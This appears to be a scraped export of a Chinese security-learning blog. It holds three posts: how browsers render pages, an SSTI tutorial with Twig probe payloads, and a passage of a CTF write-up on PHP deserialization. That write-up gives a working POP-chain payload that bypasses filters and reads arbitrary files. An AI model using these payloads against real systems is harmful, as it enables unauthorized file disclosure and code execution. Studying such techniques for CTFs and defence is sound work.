cwnd = 1（2013年的RFC6928规定一个cwnd表示10个TCP segment） - 每过一个RTT，即收到ACK之后，cwnd = cwnd * 2，呈指数增长 cwnd = sshtresh 慢启动与拥塞避免算法都可 cwnd \u0026gt; sshtresh，改用拥塞避免算法,我们这里介绍 Additive increase/multiplicative decrease, AIMD算法（加法增加乘法减小算法） - 在cwnd大于sshtresh之后，每当发送方收到一个ACK之后，++cwnd;呈线性上升，这就是 加法增加 - 一旦出现网络拥塞，就进行 乘法减小 即将 sshtresh = cwnd/2； cwnd = 1 - 接着切换到慢启动算法重新开始 Figure 3: TCP Slow start \u0026amp; AIMD\nParsing 解析 当浏览器收到了第一块数据，它就会直接开始解析收到的信息，第一步就是将接收到的数据转换为 DOM \u0026amp; CSSOM, 这两个结构是渲染器用来绘制网页的 DOM, Document Object Model, 是一个用来将XML或者HTML转换为树结构的跨平台，独立于语言的API，可以通过JS调用API来进行修改。 即使请求的HTML文件大于14KB，浏览器仍然会直接尝试解析并渲染第一块14KB的数据，这也就是为什么开发者在做web性能优化的时候，需要将CSS以及HTML控制在14KB之内，以此来保障网页能够成功进行初级渲染。 一个TCP packet最大可以达到1500 bytes，同时其中有40 bytes需要别用作TCP协议（TCP headers），那么也就剩下1460 bytes来承载实际的数据，那么十个TCP packets就是14,600 bytes也就是大约14KB的数据（慢启动一般会从十个TCP数据包开始传输）：Critical Resources and the First 14 KB - A Review 接下来我们就会介绍 关键渲染 路径的五个步骤，即浏览器如何将HTML，CSS以及JS转换成屏幕的像素 Building the DOM tree 构建DOM 第一步就是处理HTML标签从而构造DOM树。 HTML的解析涉及到 tokenisation 以及树的构造 我们可以观察下图来看到DOM是如何同通过HTML标签来构造树的： \u0026lt;html\u0026gt; 是第一个标签，也就是DOM tree的根节点，其他的标签就作为子节点根据对应的结构进行组合 Figure 4: DOM tree\nPreload scanner 预加载扫描器 当浏览器在构建DOM tree时，Preload scanner就会占据主线程，并同步开始请求高优先级的资源，以此保证解析不会卡在这些资源的获取上，例如CSS, JS, images, web fonts。 例如下列标签就会在HTML解析的过程中，被preload scanner 所请求获取 \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; src=\u0026#34;styles.css\u0026#34;/\u0026gt; \u0026lt;script src=\u0026#34;myscript.js\u0026#34; async\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;img src=\u0026#34;myimage.jpg\u0026#34; alt=\u0026#34;image description\u0026#34;/\u0026gt; \u0026lt;script src=\u0026#34;anotherscript.js\u0026#34; async\u0026gt;\u0026lt;/script\u0026gt; Building the CSSOM 第二步就是构建CSSOM树，CSSOM树与DOM类似，只不过处理的是CSS而非HTML，通过将CSS规则以及CSS selectors所制定的关系结构转换为一个树的结构 Figure 5: CSSOM\nOther Processes JavaScript Compilation\n当CSS在被解析并构建CSSOM的同时，JS文件也在被下载，解释，编译，解析以及执行，这些脚本会被解析并存入 Abstract syntax tree，抽象语法树 Figure 6: AST\nBuilding the Accessibility Tree 构建辅助功能树\n浏览器还会构建 accessiblity tree 来辅助设备来解析和解释内容，accessibility object model (AOM) 拥有与DOM类似的语法结构，AOM一般来说是无法访问的。 在AOM被构建之前，所有的内容都是无法被屏幕阅读器所访问的 那到底什么是Accessibility辅助功能，它有什么作用呢，相信大家都在浏览器的开发者工具里看到过这个功能，甚至在电脑，手机都有看到过这个功能，大概看起来是一个方便disable来使用电子设备的功能，但是我们平时却很少使用。 Accessibility 的目标是使尽可能多的人能够更好的访问网页，不仅仅是有障碍的人士，同时也帮助那些使用移动端设备或者网速很慢的用户群体。 Firefox内置了Accessibility APIs来对网页的内容进行解析，分析不同的元素的功能与角色，从而并构造AOM，同时根据一些网页设计的标准来判断开发是否规范，例如HTML标签是否使用得当，文字的大小，比例，颜色，对比度等内容是否适合与不同的设备，对视力有障碍的人士是否友好。 Firefox官方的一个视频展示了一个很好的例子，对于一个网页的内容，普通人可以进行正常的阅读，但是当这个内容在视力有障碍的人士使用工具进行朗读的时候，也许就会出现问题，这也体现了Accessibility的作用 Render 渲染 渲染的步骤包括计算样式（style），计算布局（layout），最后绘制（paint），在一些情况下还包含了合成。 Style 关键渲染路径的第三步就是将DOM以及CSSOM结合到render tree渲染树/ computed style tree 计算得到的样式树中： 对于每一个DOM树中的可视节点，都会将CSSOM中对应的样式与其配套 Layout 在确定了每一个节点的样式完成渲染树之后，第四步就是要考虑如何对所有的这些元素进行排列，通过从渲染树的根开始遍历，对每个节点的几何信息进行计算，例如宽度和高度，以及在页面中的位置 第一次对于位置以及大小的计算我们称为 layout , 当我们再次确定页面中一些资源的大小例如图片加载完成之后，重新进行计算叫做 reflows 回流 Paint 关键渲染路径的最后一步就是Paint绘制，就是要将所有的可视的内容都绘制到屏幕上去，包括文字，颜色，间距，阴影以及可以替换的元素，例如按钮（按下去的图片）以及图片。 为了保证页面能够流畅的滚动以及动画效果，Paint将占据主线程来进行绘制，为了确保绘制的速度，屏幕上的绘图通常会被分解称数层来进行，那么同时也就需要进行合成。 绘制会讲layout tree 中的元素分成多层，将内容提升到GPU可以提高绘制和宠幸绘制的性能：有一些特定的属性和元素可以组成一个层（例如\u0026lt;video\u0026gt;, \u0026lt;canvas\u0026gt;）；CSS属性为opacity、3D transform、 will-change的元素，也可以组成单独的层来进行绘制，不过这也意味着需要消耗更多的内存，注意不能过度使用 Compositing 合成 那么在Paint的过程中分层进行之后，就需要对所有的层进行合成，相互重叠，保证它们以正常的顺序绘制到屏幕上，显示正常的内容。 Figure 7: Critical rendering path\nInteractivity 交互 主线程绘制页面的任务完成并不代表一切都准备就绪，还需要加载JavaScript脚本（比如onload属性就是等待给定的资源加载完成时触发），那么在加载JS的过程中，记得我们的浏览器大部分还是一个单线程，因此就无法进行滚动、触摸或者其他的交互 我们用 Time to Interactive (TTI) 来衡量从第一个请求所触发DNNS查询开始到页面可以正常教务所使用的时间，页面需要在50ms，如果此时主线程还在解析，编译和执行JS就会导致页面不不能相应用户的交互，这就是需要调整的地方。 后记 对于浏览器原理的学习源于在SSTI模版注入的学习中，在我想要搞清楚模版引擎的作用和意义的时候，很多博客中不断出现一个既陌生又熟悉的字眼：“渲染”，于是就想要探寻一下完整的WEB的工作框架，在一番学习之后，貌似学到了很多东西，但是又同时也带来了更多的疑问。 在这个过程中也暴露了我在CTF WEB方向学习中的一个弊端，就是往往一些简单的题目更多的是在考验对于漏洞的理解和利用，但是实现的场景非常的原始，往往都是整一个HTML返回到前端，这肯定是与真实场景所不符合的，我觉得我应该对开发有更深刻的理解，才能更好的去发现漏洞。比如在模版引擎的学习中，提到很多的例子就是查询，于是当我尝试去Google一个东西，在看到Burp返回之前，我都不确定返回过来的内容应该是完整的页面还是一个HTML框架加上JS脚本来获取进一步的数据，更别说其背后协作的原理。 那么在后记中我还想对于渲染以及上述提到的浏览器工作原理中扩展内容进行一些补充，因为我发现我现在只是有一个大概的了解，但好像还是理解的不那么充分。 脚本和样式文件对于页面渲染的影响 本章内容主要参考：浏览器是如何渲染页面的？ 脚本文件对于页面渲染的影响\n在解析HTML标签的过程中，我们知道浏览器会将从服务器所获取的文档自上而下进行解析，在文档中的\u0026lt;script\u0026gt;标签不含 defer 以及 async 属性的情况下，浏览器会根据以下规则进行操作： 解析HTML文档，遇到HTML标签，构建DOM树 构建DOM的过程中，如果遇到外部的样式文件或者脚本文件的申明，暂停当前文档的解析，创建新的网络连接，开始下载样式文件和脚本文件。原因就是我们之前提到的，浏览器在大部分时候都是单线程工作的。 样式文件下载完成之后，就开始构建CSSOM；脚本文件下载完成后，解释并立即执行 我们可以通过一个例子来演示这个中断 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;defer.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; body render! \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; head中过所加载的脚本文件为 alert(\u0026#39;I am the script\u0026#39;); Figure 8: Load and execute script before render\n我们可以观察到，根据html文档的顺序，浏览器会先加载JS脚本，并且在脚本加载完毕之后直接执行，也就是跳出提示框，接着才能重现回来解析HTML并且渲染最终body的内容 很显然，这种中断不是用户所想要看到的，因此开发者应该合理的使用 \u0026lt;script\u0026gt; 标签中的 defer \u0026amp; async 属性来调整脚本的下载和执行的顺序，使其不会阻塞页面的加载 defer：开启新的线程下载脚本，并且在文档解析完成之后立即执行脚本 : - defer只适用于外联脚本（需要加载的js文件），如果 \u0026lt;script\u0026gt; 标签没有指定 src 属性，就只是内联脚本，不需要使用defer - 如果有多个申明了的defer外联脚本，则会按照顺序加载和执行 - defer外联脚本会在 DOMContentLoaded 和 Load 事件之前执行 我们利用下面的例子来进行测试 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;defer1.js\u0026#34; defer\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;defer2.js\u0026#34; defer\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; defer\u0026gt; console.log(\u0026#39;使用了defer属性的内联js\u0026#39;) \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; document.addEventListener(\u0026#34;DOMContentLoaded\u0026#34;, function() { console.log(\u0026#39;DOMContentLoaded\u0026#39;); }, false); window.addEventListener(\u0026#39;load\u0026#39;, function() { console.log(\u0026#39;onload\u0026#39;); }, false); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; defer1.js: console.log(\u0026#39;defer1\u0026#39;); defer2.js: console.log(\u0026#39;defer2\u0026#39;) 我们可以观察到html一共有4个脚本，全部都打上了defer属性，但是其中只有 defer1.js \u0026amp; defer2.js 两个文件是外联的，因此我们可以观察脚本执行的顺序，首先内联的脚本会在解析body中的内容之前就被加载与执行，defer1.js \u0026amp; defer2.js会在DOMContentLoaded \u0026amp; Load事件之前执行 Figure 9: 内联脚本使用defer\nasync: 异步下载脚本文件，下载完毕之后立即解释执行代码，是HTML5新增的属性 : - 只适用于外联脚本文件，于defer一致 - 如果有多个async的脚本，每一个脚本都会开启一个新的线程，因此它们的下载和执行都是异步的，不能确保彼此的先后顺序 - async会在load事件之前执行，但是不能确保与DOMContentLoaded的执行显示顺序 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;async1.js\u0026#34; async\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;async2.js\u0026#34; async\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; async\u0026gt; console.log(\u0026#39;使用了async属性的内联js\u0026#39;) \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; document.addEventListener(\u0026#34;DOMContentLoaded\u0026#34;, function() { console.log(\u0026#39;DOMContentLoaded\u0026#39;); }, false); window.addEventListener(\u0026#39;load\u0026#39;, function() { console.log(\u0026#39;onload\u0026#39;); }, false); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; async1.js: console.log(\u0026#39;async1.js\u0026#39;) async2.js: console.log(\u0026#39;async2.js\u0026#39;) 我们可以根据下面三次的结果观察到： async对于内联的脚本无效，仍然会占据浏览器的主线程进行加载和执行 async会在onload之前发生 async与DOMContentLoaded的执行顺序不确定 async外联脚本之前的执行顺序不确定 Figure 10: 在DOMContentLoaded之后执行\nFigure 11: 在DOMContentLoaded之前执行\nFigure 12: async外联脚本的执行顺序不确定\n下面的图很好的总结了内联，以及两种外联脚本的加载与执行的顺序以及与HTML解析的关系： 内联脚本会中断HTML的解析（绿色），转而加载（蓝色）以及执行（红色），完成之后再重新开始HTML解析 defer外联脚本则是开启新的线程去加载，并且在文档解析完成之后立即执行 async外联脚本会开启新的线程去加载，不会中断HTML的解析，但是加载完成之后立即执行，此时会中断HTML的解析 Figure 13: normal, defer, async脚本加载执行的过程\n综上所述，我们知道了 defer \u0026amp; async 属性都可以防治外联脚本的加载阻碍页面的渲染，如果外联脚本之间没有依赖以及顺序关系，可以使用async，反之则可以使用async。如果不想使用这两个属性，直接将所有的脚本放在 \u0026lt;/body\u0026gt; 也就是HTML页面内容结束之前，也可以达到相同的效果。 样式文件对于页面渲染的影响\n我们在正文中的提到过在解析Parse阶段的时候，浏览器会解析HTML并构建DOM树，同时也会解析CSS来构建CSSOM树，这里我们具体来讲讲对于CSS的处理会如何影响页面的渲染。 如果CSS文件放在 \u0026lt;head\u0026gt; 标签中，也就是 \u0026lt;body\u0026gt; 之前那么CSSOM树就会先被解析和构建，那么当浏览器开始解析和构建DOM树时就可以顺便完成渲染； 但是如果CSS放在所有页面标签之后，比如 \u0026lt;/bdoy\u0026gt; 之前，那么只有当DOM树构建完成之后，CSSOM树才开始构建，渲染树也的构建时间也需要延后，这就回导致浏览器不得不重新渲染整一个页面，造成了资源的浪费，也会让页面内容出现混乱，一切都要等待CSS加载完成，页面完成重绘之后才能回复。 因此，脚本和样式文件的位置都需要权衡其利弊，来决定是应该放在顶部提前解析/执行，还是放在底部来让出资源。 回流和重绘\nReflow 回流 : 第一次确定网页节点的几个位置称为布局（layout），第二次重新计算尺寸以及位置叫做回流（reflow）。 比如第一次的布局已经完成，此时图片又加载完成，那么渲染树就需要重新计算每个节点的尺寸、位置，此时就会触发reflow操作，重新构建渲染树 \u0026lt;br/\u0026gt; 那么在触发回流的同时，就势必会触发repaint(重绘)以及recomposite(重组) \u0026lt;br/\u0026gt; 会触发reflow的操作 : - Reflow的成本要比Repaint来的高，DOM树的每个节点都会有一个reflow方法，一个节点的reflow可能造成一连串依赖节点的reflow，如果发生在移动端设备上，这个过程将是耗时耗电的： - 增加、删除、修改DOM节点 - 移动DOM的位置 \u0026lt;br/\u0026gt; - 绘制动画 \u0026lt;br/\u0026gt; - 修改CSS样式 \u0026lt;br/\u0026gt; - Resize窗口或者滚动窗口 \u0026lt;br/\u0026gt; - 修改网页的默认字体 \u0026lt;br/\u0026gt; - display:none会触发reflow; visibility:hidden只会触发repaint，影响较于reflow更小 \u0026lt;br/\u0026gt; 我们如何才能将reflow对于性能的影响减到最小呢？ 不要逐条修改DOM样式，可以预先定义好css的class，然后修改DOM中的className // 不好的写法 var left = 10, top = 10; el.style.left = left + \u0026#34;px\u0026#34;; el.style.top = top + \u0026#34;px\u0026#34;; // 推荐写法 el.className += \u0026#34; theclassname\u0026#34;; 将DOM进行离线修改：先用 documentFragment 对象在内存中操作DOM，将其设置为display:none触发reflow与repaint，再完全修改完成之后，再显示出来，这样就不会重复触发reflow；或者可以克隆一个DOM节点到内存中，修改完成之后再整一个与当前的DOM进行交换 不要使用table布局，因为可能会因为一个很小的改动就造成整一个table的重新布局 onload事件和DOMContentLoaded事件\nDOMContentLoaded 事件，顾名思义，就是要等DOM构建完成，即HTML文档被完全加载和解析之后触发的事件，无需等待样式，图片，自框架的记载 onload 事件则是需要等待所有的元素，包括图片以及脚本等全部加载完成之后才会触发，也就是会晚于DOMContentLoaded执行，我们通过之前的例子也可以观察得到onload永远是在最后发生的。 因此，在页面的图片很多，网络不好的情况下，用户从导航到onload事件的触发需要很长的时间，如果此时在onload中加入很多初始化的动作，势必会影响用户的体验，这时就需要用DOMContentLoaded时间来代替onload事件才是更合适的。 前端页面渲染的几种方式（CSR/SSG/SSR） 本章内容主要参考：前端页面渲染的几种方式（CSR/SSG/SSR） 接着我们来了解一下页面渲染的几种基础的模式 客户端渲染 CSR (Client Side Render)\n客户端渲染，顾名思义就是页面的渲染会在客户端的浏览器中进行，我们常见的react, vue单页应用框架就是使用了客户端渲染。 浏览器访问网页，服务器会先返回html的内容，并开始构建DOM树，CSS样式以及JS脚本将会在DOM树构建完成之后再进行加载，进而改变DOM树的结构，完成渲染。 CSR就比较适用于单页应用(single page applications, SPA)，还有用户交互比较多的应用（比如游戏），因为涉及到大量动态的数据获取，比如表格，聊天内容等 Pros Cons 服务器相应速度快，原始html，js，css返回给浏览器就可以了 在js得到渲染之前，页面中没有内容，出现白屏，降低用户体验 对于页面交互、单页应用比较友好，因为其在动态内容的加载方面比较方便 页面渲染代码在JS中，爬虫不能解读，对于SEO(Search Engine Optimised)引擎不够友好 爬虫主要分为低级爬虫和高级爬虫两种： 低级爬虫：只请求URL，URL返回的HTML是什么就爬取什么内容（CSR中的HTML并不是完整的页面信息，还需要进行JS获取后才能结合渲染） 高级渲染：请求URL，加载并执行JS脚本渲染页面，爬取渲染后的内容 Figure 14: CSR 客户端渲染流程 1\nFigure 15: CSR 客户端渲染流程 2\n服务端渲染 SSR (Server Side Render)\nSSR较于CSR，最大的区别就是其在服务端就先对页面进行渲染，每次当用户请求访问一个页面的时候，都会向服务器发送请求，并动态渲染完成页面（结合HTML，CSS以及CS）后再传回给浏览器，因此相应的时间势必会加长。 Figure 16: SSR 服务端渲染流程 1\nFigure 17: SSR 服务端渲染流程 2\nPros Cons 拥有良好的SEO（因为返回的都是完整的HTML页面，可供爬虫读取） 因为需要再服务端进行完整的渲染和数据处理后才会返回，因此服务器响应时间很长 支持页面交互 服务端维护成本更高 图片中提到的注水和脱水操作，可以参考这里，这里就不详细展开了 静态页面生成 SSG (Static Site Generation)\n静态页面与前面两种渲染不同的地方就在于，其无法完成交互，只有静态的内容展示，就比如我们的博客，架设在github.io上，每次提交之后就会自动生成完整DOM的html页面供浏览器访问。 Pros Cons 拥有良好的SEO（与SSR的原理相同） 不支持页面交互 HTML包含渲染的DOM，加载更快 构建过程中没有window，document等，存在兼容问题 Figure 18: SSR 静态页面生成流程 1\nFigure 19: SSR 静态页面生成流程 2\nReference Populating the page: how browsers work 渲染页面：浏览器的工作原理 浏览器是如何渲染页面的？ Critical Resources and the First 14 KB - A Review 关于首屏html应限制在14kb内的探究 详解TCP中的拥塞控制 What is accessibility? Accessibility Inspector 浏览器是如何渲染页面的？ 前端页面渲染的几种方式（CSR/SSG/SSR） Visual Explanation and Comparison of CSR, SSR, SSG and ISR ","date":"2022-06-24T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/how_browsers_work/","title":"浏览器是如何工作的？"},{"content":"Server Side Template Injection (SSTI) 模板注入：基础知识 模板引擎是什么？我们为什么要用到它？ Template processor (template engine or template parser)，模板处理器或者叫做模板引擎，wikipedia给的定义是一个将数据和模板组合形成文档的软件。 模板引擎的输入一般是用template language 模板语言写的模板，以及需要替换模板中占位内容的真实数据，经过模板引擎的解析之后，最后的输出就是数据与模板结合的文档，网页或者源代码。 Figure 1: Template processor\n我们可以拿Powerpoint的Design Ideas功能来做一个例子，我认为这本质上也是一种模版引擎，我们只需要输入文字和每一张slide的内容，Powerpoint自动会生成排版来呈现这些数据 Figure 2: Powerpoint: Design Ideas\n我们在Web开发中所用到的模板应该具体到 Web template system 网页模板系统，这是运用在网页开发中的模板引擎，网页开发者可以利用其将 数据与页面分开 ，通过将静态的页面与动态获取的数据进行结合生成新的HTML文件（根据浏览器发出的请求参数，例如一次搜索），提高了开发效率，也使代码重用变得更加容易 Figure 3: Web template system\n模板引擎的主要思想就是要将 用户界面 与 业务数据 的内容分离，比如在我们提到的Powerpoint的例子中，用户只需要思考每个页面上需要展示什么数据即可，排版布局就交给了软件本身。 同样的，在网页模板系统中，我们可以说将前后端的工作进一步分离开来，前端可以可以更专注于页面布局，业务逻辑的设计上，而后端可以专注于数据的处理 在传统的网页开发中，为了展示数据，需要如下将JS代码与HTML拼接在一起，存在的问题就是拼接很容易出错，同时一旦出错或者需要修改，那么就需要前后端一起进行修改，代码不易维护。 for (var i = 0; i \u0026lt; result.length; i++) { html += \u0026#39;\u0026lt;!DOCTYPE html\u0026gt;\\ \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\\ \u0026lt;head\u0026gt;\\ \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt;\\ \u0026lt;title\u0026gt;\u0026#39;+ title +\u0026#39;\u0026lt;/title\u0026gt;\\ \u0026lt;/head\u0026gt;\\ \u0026lt;body\u0026gt;\\ \u0026lt;h1 οnclick=\u0026#34;sayHi(\u0026#39;+name+\u0026#39;)\u0026#34;\u0026gt;你好,\u0026#39;+name+\u0026#39; 我今年 \u0026#39;+age+\u0026#39;岁\u0026lt;/h1\u0026gt;\\ \u0026lt;ul\u0026gt;\\ \u0026lt;li title=\u0026#34;\u0026#39;+hobbies[0]+\u0026#39;\u0026#34;\u0026gt;\u0026#39;+hobbies[0]+\u0026#39;\u0026lt;/li\u0026gt;\\ \u0026lt;/ul\u0026gt;\\ \u0026lt;/body\u0026gt;\\ \u0026lt;/html\u0026gt;\u0026#39;; } 使用模板引擎就可以很好的解决这个问题，前端开发者可以专注于开发模版，即网页的布局与框架，同时留下数据部分，等待填充 template.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;My Webpage\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt;Hello, \u0026lt;/div\u0026gt; {{ name }} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; twig_render.php \u0026lt;?php require_once(\u0026#39;../../../../PHP_Resources/vendor/autoload.php\u0026#39;); $loader = new \\Twig\\Loader\\FilesystemLoader(\u0026#39;./\u0026#39;); $twig = new \\Twig\\Environment($loader); echo $twig-\u0026gt;render(\u0026#39;template.html\u0026#39;, [\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;John\u0026#39;]); ?\u0026gt; 接着访问twig_render.php即可 Figure 4: 访问 twig_render.php\n包括现在比较成熟的框架例如VUE等，我觉得也是利用了模板引擎的思想，尽量使前后端的工作分离，同时又方便了协作 SSTI 模板注入 SSTI 模板注入是一种Web注入漏洞，其产生的原因本质上是对于用户的输入没有做全面的审核，导致了 模板 拼接了用户输入的 模板语言 代码，进而被模板引擎所执行，从而引发敏感信息泄露，远程代码执行等问题 Web应用可以使用模板系统来动态的显示一些信息，比如下面的例子就是可以动态的显示用户的姓 $output = $twig-\u0026gt;render(\u0026#34;Dear {first_name},\u0026#34;, array(\u0026#34;first_name\u0026#34; =\u0026gt; $user.first_name) ); 一切看起来都没有问题 但是如果我们允许用户进行输入，就会引发风险，我们这里不再是简单的使用一个值了，而是引入了一个用户输入 $_GET['custom_email'] 进行拼接 $output = $twig-\u0026gt;render($_GET[\u0026#39;custom_email\u0026#39;], array(\u0026#34;first_name\u0026#34; =\u0026gt; $user.first_name) ); custom_email={{7*7}} 49 custom_email={{self}} Object of class __TwigTemplate_7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5 could not be converted to string 如果是在黑盒的条件下，我们很容易测试出来XSS，但是这往往就会让我们忽略了模板引擎的存在，并且与XSS不同的是，模板注入可以直接对服务器造成危害 模板注入的方法 我们根据 James Kettle 所提供的模板注入流程来进行介绍 Figure 5: Template Injection methodology\nDetect Plaintext context 纯文本的上下文 大部分模板语言都提供纯文本的输入，可以直接看到反馈的结果 smarty=Hello {user.name} Hello user1 freemarker=Hello ${username} Hello newuser any=\u0026lt;b\u0026gt;Hello\u0026lt;/b\u0026gt; \u0026lt;b\u0026gt;Hello\u0026lt;b\u0026gt; Code context 代码上下文 我们通过输入一些代码片段来观察返回的内容是否显示了我们想要得到的拼接结果 personal_greeting=username Hello user01 personal_greeting=username\u0026lt;tag\u0026gt; Hello personal_greeting=username}}\u0026lt;tag\u0026gt; Hello user01 \u0026lt;tag\u0026gt; Identify 在成功检测到了模板引擎的存在之后，下一步就是要确定哪一种引擎被使用了，我们可以根据不同的语法来进行输入并观察返回的结果 James Kettle 为我们提供了这张决策树，绿色表示成功识别，红色代表失败需要进一步尝试 例如当我们在尝试 {{7 * 7'}} 时，如果返回49那么就是Twig,如果是 7777777 就是 Jinja2 Figure 6: 模板识别\nExploit 接着我们就要尝试利用这些模板引擎 Read\n在我们识别成功之后，下一步就是非常关键的阅读文档阶段，只有了解了模板语言之后我们才能找到利用的方法: 基础的语法 查看有关安全的相关章节，我们可以假设一些开发者并没有关注这些容易出现问题的点 内置的方法，函数，过滤器以及变量，比如查看内置的函数的源码，是否有出现危险函数的使用，从而进一步引发远程代码执行？ 查看插件或者扩展，特别是那些默认开启的内容 Explore\n下一步就是关注模板引擎运行环境，通常这些模板引擎会提供一些全局变量或者实例对象，这些实例中往往就存在一些敏感信息或者危险的函数可以被调用 如果没有这样的内置对象可以为我们所用，也可以通过fuzz寻找可能的变量名，比如SecLists Attack\n在经过以上两步的信息获取之后，最后就是要用所有可以利用的资源来组合进行攻击，尝试造成一些常见的攻击，比如非法对象创建，敏感信息泄露，远程文件包含，webshell，提权等 Reference Template processor Template Injection in Action 什么是模板引擎？ 模板引擎？看这一篇就懂了 一、模板引擎有什么用？ Server-Side Template Injection ","date":"2022-06-23T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/ssti_basic/","title":"Server Side Template Injection (SSTI) 模板注入：基础知识"},{"content":"PHP 反序列化实例练习 实例1 来源：php反序列化利用——POP链构造实例 \u0026lt;?php // 题目中的第一个Class class MyDirectory { public $name; // 构造器，新的对象建立时被调用 public function __construct($name) { $this-\u0026gt;name = $name; } // 当一个对象被当作字符串使用时触发 public function __toString(){ // 统计当前目录下的文件数量 $num = count(scandir($this-\u0026gt;name)); if($num \u0026gt; 0){ return \u0026#34;count $num files\u0026#34;; } else { // C限制点 return \u0026#34;flag path is /flag_{{uuid}}\u0026#34;; } } } // 题目中的第二个Class class MyFile { public $name; public $user; public function __construct($name, $user) { $this-\u0026gt;name = $name; $this-\u0026gt;user = $user; } public function __toString(){ return file_get_contents($this-\u0026gt;name); } // B限制点 // 反序列化时调用 public function __wakeup(){ if(stristr($this-\u0026gt;name, \u0026#34;flag\u0026#34;)!==False) $this-\u0026gt;name = \u0026#34;/etc/hostname\u0026#34;; else $this-\u0026gt;name = \u0026#34;/etc/passwd\u0026#34;; if(isset($_GET[\u0026#39;user\u0026#39;])) { $this-\u0026gt;user = $_GET[\u0026#39;user\u0026#39;]; } } public function __destruct() { // 会调用__toString echo $this; } } //题目中的限制 if(isset($_GET[\u0026#39;input\u0026#39;])){ $input = $_GET[\u0026#39;input\u0026#39;]; // A限制点 if(stristr($input, \u0026#39;user\u0026#39;)!==False){ die(\u0026#39;Hacker\u0026#39;); } else { unserialize($input); } }else { highlight_file(__FILE__); } 观察源码我们可以很容易的发现最终的目标，就是让 MyDirectory 的对象通过 __toString 来返回flag文件的路径 源码内我们标出了三个限制点： A, 对GET输入检查是否包含\u0026rsquo;users\u0026rsquo;字符串，我们可以通过修改序列化字符串中的s为S，这样就可以支持利用16进制编码来进行绕过， s:4:\u0026quot;user\u0026quot;; -\u0026gt; S:4:\u0026quot;use\\72\u0026quot;; B, 我们在序列化的字符串中对于 MyFile-\u0026gt;name 会被 __wakeup 给替换掉，我们可以利用修改属性来绕过 __wakeup 的替换（此方法只适用于PHP5 \u0026lt; 5.6.25, PHP7 \u0026lt; 7.0.10），这里我们使用浅copy来对可控变量 $this-\u0026gt;user 来进行过滤 C, 无法直接获取文件名，可以配合 glob:// 协议来测信道出 flag 的文件名字 因此我们构造 payload： \u0026lt;?php class MyFile { public $name=\u0026#39;/etc/hosts\u0026#39;; public $user=\u0026#39;\u0026#39;; } $a = new MyFile(); // 利用可控参数 $a-\u0026gt;user来绕过 $this-\u0026gt;name的过滤 // \u0026amp;$a-\u0026gt;user表示传一个引用，而不是单纯的值，结果就是如果 $a-\u0026gt;user 发生改变，那么 $a-\u0026gt;name 也会跟着改变 // 这样就可以防止 $a-\u0026gt;name 被替换，同时因为Myfile中会根据 $_GET[\u0026#39;user\u0026#39;] 来给 $a-\u0026gt;user 赋值，因此可以完成变量控制 $a-\u0026gt;name = \u0026amp;$a-\u0026gt;user; $b = serialize($a); // 绕过 \u0026#39;user\u0026#39; 过滤 $b = str_replace(\u0026#34;user\u0026#34;,\u0026#34;use\\\\72\u0026#34;,$b); $b = str_replace(\u0026#34;;s:4:\u0026#34;,\u0026#34;;S:4:\u0026#34;,$b); var_dump($b); // 得到序列化结果: // O:6:\u0026#34;MyFile\u0026#34;:2:{s:4:\u0026#34;name\u0026#34;;s:0:\u0026#34;\u0026#34;;S:4:\u0026#34;use\\72\u0026#34;;R:2;} // 文件任意读 payload： // input=O:6:\u0026#34;MyFile\u0026#34;:2: {s:4:\u0026#34;name\u0026#34;;s:0:\u0026#34;\u0026#34;;S:4:\u0026#34;us\\65r\u0026#34;;R:2;}\u0026amp;user=/proc/self/mounts Payload中出现的 R:2; 表示的变量的类型是引用（显示的引用） 这一步的目的是通过构造POP链来调用敏感函数 file_get_contents 来获取任意文件的内容； __construct() ( -\u0026gt; 